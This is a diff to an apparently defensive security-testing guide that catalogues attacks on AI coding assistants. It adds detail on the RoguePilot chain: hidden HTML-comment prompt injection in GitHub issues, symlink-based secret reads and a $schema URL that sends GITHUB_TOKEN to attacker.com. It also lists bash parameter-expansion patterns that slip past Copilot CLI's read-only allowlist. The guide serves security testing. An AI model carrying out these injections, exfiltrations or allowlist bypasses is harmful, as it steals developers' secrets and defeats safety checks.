@@ -63,11 +63,13 @@ A major new attack surface category: **30+ vulnerabilities across 10+ AI coding 
 - One compromised rules file shared across projects creates widespread supply chain compromise
 - Test for: inspect `.cursorrules`, `.github/copilot-instructions.md`, and similar config files for hidden Unicode content
 
-**RoguePilot (Orca Security, 2026):**
-- Passive prompt injection via GitHub issues enabling **GITHUB_TOKEN theft** through Codespaces/Copilot
-- Attack uses hidden HTML comments in GitHub issues to inject prompts when a Codespace is opened
-- Exploits VS Code's `json.schemaDownload.enable` setting to exfiltrate tokens to external servers
-- Patched by Microsoft — test for similar patterns in other IDE integrations
+**RoguePilot (Orca Security, February 2026):**
+- AI-mediated supply chain attack: passive prompt injection via GitHub issues enabling **full repository takeover** through Codespaces/Copilot
+- Attack uses hidden HTML comments (`<!--instructions-->`) invisible in issue rendering but parsed by Copilot
+- **Symlink secret exfiltration**: injected prompt instructs Copilot to `gh pr checkout` a crafted PR containing a symlink (`1.json` → secrets file); guardrails don't follow symlinks, so agent reads secrets through the link
+- **$schema exfiltration**: Copilot creates JSON file with `$schema` property pointing to `attacker.com/steal?token=GITHUB_TOKEN` — silent OOB exfil via JSON Schema resolution
+- Full attack chain: malicious issue → HTML comment injection → Codespace launch → symlink PR checkout → token exfiltration → repository takeover with read/write access
+- Patched by Microsoft — test for similar patterns in other IDE integrations that process issue/PR content
 
 **CamoLeak (Legit Security, March 2026):**
 - Critical vulnerability enabling **private source code exfiltration** from GitHub Copilot
@@ -83,7 +85,10 @@ A major new attack surface category: **30+ vulnerabilities across 10+ AI coding 
 
 **Copilot CLI Arbitrary Code Execution:**
 - PromptArmor demonstrated GitHub Copilot CLI can download and execute malware with **zero user approval**
-- CVE-2026-29783: shell tool allows arbitrary code execution through bash parameter expansion patterns
+- CVE-2026-29783 (CVSS 8.8): shell tool in Copilot CLI ≤0.0.422 allows arbitrary code execution through bash parameter expansion patterns
+- **Technical details**: parser validated the executable binary but failed to recursively sanitize arguments for side-effect-inducing syntax — dangerous patterns: `${var@P}` (prompt expansion), `${var=value}` / `${var:=value}` (assignment), `${!var}` (indirect expansion), nested `$(cmd)` or `<(cmd)` inside `${...}` expansions
+- Prompt injection via repository files, MCP server responses, or user instructions can embed these patterns in commands classified as "read-only" — bypassing safety assessment entirely
+- Patched in Copilot CLI 0.0.423 — test for similar shell expansion gaps in other AI CLI tools with command allowlists
 
 **Extension Recommendation Attacks (Koi Security, 2026):**
 - Cursor, Windsurf, Google Antigravity, and Trae recommend non-existent VSCode extensions from OpenVSX registry
